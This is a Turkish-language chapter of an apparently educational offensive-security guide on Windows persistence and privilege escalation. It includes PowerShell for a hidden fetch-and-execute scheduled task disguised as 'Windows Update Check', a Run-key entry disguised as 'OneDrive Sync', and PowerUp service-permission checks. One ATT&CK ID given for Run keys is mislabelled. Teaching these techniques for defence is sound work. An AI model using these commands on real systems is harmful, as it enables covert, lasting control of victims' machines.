# 5.3. Kalıcılık ve Yetki Yükseltme

[↩️ Geri: İçindekiler](../../README.md)

Sisteme sızan bir saldırganın iki ana hedefi daha vardır:
1.  **Kalıcılık (Persistence):** Sistem yeniden başlasa veya kullanıcı oturumu kapatsa bile erişimini sürdürmek.
2.  **Yetki Yükseltme (Privilege Escalation):** Standart bir kullanıcı hesabından, sistemde tam kontrol sahibi olacağı `NT AUTHORITY\SYSTEM` veya `Administrator` gibi bir hesaba geçmek.

### Kalıcılık Teknikleri

-   **Zamanlanmış Görevler (T1053.005: Scheduled Task)**
    Belirli aralıklarla veya belirli bir olay tetiklendiğinde (örn: kullanıcı oturum açtığında) zararlı bir script'i çalıştırmak için kullanılır.
    ```powershell
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c 'IEX(New-Object Net.WebClient).DownloadString(...)'"
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "Windows Update Check" -Action $action -Trigger $trigger
    ```

-   **Registry Run Keys (T1137.001: Logon Scripts)**
    Windows başladığında veya kullanıcı oturum açtığında otomatik olarak çalıştırılacak programların listelendiği kayıt defteri anahtarlarına zararlı komut eklemek.
    ```powershell
    $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $name = "OneDrive Sync"
    $command = "powershell.exe -w hidden -c '...'"
    Set-ItemProperty -Path $path -Name $name -Value $command
    ```

### Yetki Yükseltme Teknikleri

-   **Zayıf Servis İzinleri (T1543.003: Create or Modify System Process: Windows Service)**
    Bazen yöneticiler, bir servisin çalıştırılabilir dosyasının veya yapılandırmasının standart kullanıcılar tarafından değiştirilmesine izin veren yanlış yapılandırmalar yapabilir. PowerUp gibi scriptler bu tür zafiyetleri otomatik olarak tarar.
    ```powershell
    # PowerUp script'i ile zafiyet taraması (örnek)
    Invoke-AllChecks
    ```
    Bulunan zayıf bir servisin çalıştırılabilir yolu, saldırganın kendi zararlı yazılımıyla değiştirilerek, servis bir sonraki yeniden başlatıldığında kodun `SYSTEM` yetkileriyle çalışması sağlanır.

---
[➡️ Sonraki Konu: Tespit Edilmekten Kaçınma (Evasion)](./04-Tespit-Edilmekten-Kacinma-Evasion.md)
